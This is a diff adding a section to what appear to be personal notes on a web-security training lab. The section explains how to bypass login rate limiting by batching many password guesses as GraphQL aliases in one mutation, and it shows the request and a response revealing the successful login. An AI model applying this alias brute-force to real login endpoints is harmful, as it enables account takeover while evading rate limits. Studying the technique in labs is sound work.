@@ -319,4 +319,49 @@ valid
 ```
 ### lab bypassing rate limit to login
 
-the login page is powered by `graphql`
+the login page is powered by `graphql` when try to login this what it show:
+```
+    mutation login($input: LoginInput!) {
+        login(input: $input) {
+            token
+            success
+        }
+```
+
+using alias to use more than on operation in one request , like this 
+```
+
+    mutation login($input: LoginInput!) {
+        login(input: $input) {
+            token
+            success
+        }
+    
+bruteforce0:login(input:{password: "hunter", username: "carlos"}) {
+        token
+        success
+    }
+```
+
+not only one , use it as much as you can , the response will be like this:
+```
+HTTP/2 200 OK
+Content-Type: application/json; charset=utf-8
+Set-Cookie: session=QdI2CSqpRw0r5eKpVfOxJgBvueNOmzsO; Secure; SameSite=None
+X-Frame-Options: SAMEORIGIN
+Content-Length: 10403
+
+{
+  "data": {
+    "login": {
+      "token": "k0LS6jqCdTFEWW5hL2y3ugtetqwktun8",
+      "success": false
+    },
+    "bruteforce0": {
+      "token": "k0LS6jqCdTFEWW5hL2y3ugtetqwktun8",
+      "success": true
+    },
+```
+
+now we know what the right username and the password , use it to login , the lab is solve 
+
